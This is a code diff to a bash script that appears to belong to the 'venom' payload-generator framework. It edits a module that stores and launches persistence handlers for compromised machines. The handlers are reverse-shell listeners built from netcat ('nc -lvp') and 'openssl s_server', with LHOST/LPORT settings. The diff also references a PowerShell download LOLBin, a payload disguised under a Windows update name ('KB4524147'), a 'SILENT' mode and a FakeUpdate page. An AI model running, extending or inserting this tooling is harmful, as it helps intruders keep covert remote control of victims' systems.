@@ -12004,46 +12004,60 @@ Colors;
 echo ""
 cd $IPATH/output
 per_list=$(ls *.txt)
-echo "${BlueF}Listing Persistence Handler(s) Stored${white}"
-echo "-------------------------------------";sleep 1
 if [ -z "$per_list" ]; then
   echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 1
-  echo "${RedF}[x]${white} None persistence ID Handler(s) Found .."${Reset};sleep 2
+  echo "${RedF}[x]${white} None persistence Handler(s) ID Found .."${Reset};sleep 3
   clear;sh_ninja
 fi
+echo "${BlueF}Listing Persistence Handler(s) Stored${white}"
+echo "-------------------------------------";sleep 1
 echo "$per_list"
 echo "";sleep 2
 
 
 ## Reading settings from persistence stored file ..
 handler=$(zenity --title="☠ PERSISTENCE HANDLER SELLECTION ☠" --text "example: persistence_ID_4Fn7.txt" --entry --width 300) > /dev/null 2>&1
-set_handler=$(cat $handler|grep -m 1 'HANDLER'|cut -d ':' -f2)
+set_name=$(cat $handler|grep -m 1 'KB4524147')
 set_lhost=$(cat $handler|grep -m 1 'LHOST'|cut -d ':' -f2)
 set_lport=$(cat $handler|grep -m 1 'LPORT'|cut -d ':' -f2)
+set_state=$(cat $handler|grep -m 1 'SILENT'|cut -d ':' -f2)
+set_handler=$(cat $handler|grep -m 1 'HANDLER'|cut -d ':' -f2)
 set_dates=$(cat $handler|grep -m 1 'ACTIVE_ON'|cut -d '=' -f2)
 
 
+## Make sure we have captured settings
+if [ -z "$set_handler" ]; then
+  echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 1
+  echo "${RedF}[x]${white} None persistence ID Handler(s) Found .."${Reset};sleep 2
+  clear;sh_ninja
+fi
+
+
 ## Displaying settings to user
-echo ""${BlueF}
+echo ""
 cat << !
 Handler: $handler
 --------------------------------
+SILENT   : $set_state
 LPORT    : $set_lport
 LHOST    : $set_lhost
 LOLBin   : Powershell (Download)
+SCRIPT   : $set_name
 ACTIVE_ON: $set_dates
 !
-echo ""${Reset};
-
+echo ""
 sleep 2
+
+
 ## Execute Sellected Handler Settings to Run
 QuE=$(zenity --question --title "☠ RUN SELLECTED HANDLER ☠" --text "Do you wish to run the Sellected Handler ?" --width 320) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-   xterm -T " PERSISTENCE LISTENER - $set_lhost:$set_lport" -geometry 110x23 -e "$set_handler"
+   xterm -T " PERSISTENCE HANDLER - $set_lhost:$set_lport" -geometry 110x23 -e "$set_handler"
 else
   echo "${RedF}[x]${white} Abort module execution .."${Reset};sleep 2
 fi
 
+## Exit Module
 cd $IPATH
 clear
 sh_ninja
@@ -12456,7 +12470,8 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT:$lport" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "SILENT:$easter_egg" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "LPORT:$lport" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "DIR: cd venom/output" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "HANDLER:sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.txt
@@ -12687,7 +12702,8 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT:$lport" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "SILENT:$easter_egg" > $IPATH/output/persistence_ID_$random_name.txt
+   echo "LPORT:$lport" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "LHOST:$lhost" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "HANDLER:sudo nc -lvp $lport" >> $IPATH/output/persistence_ID_$random_name.txt
    echo "ACTIVE_ON=$dtr" >> $IPATH/output/persistence_ID_$random_name.txt
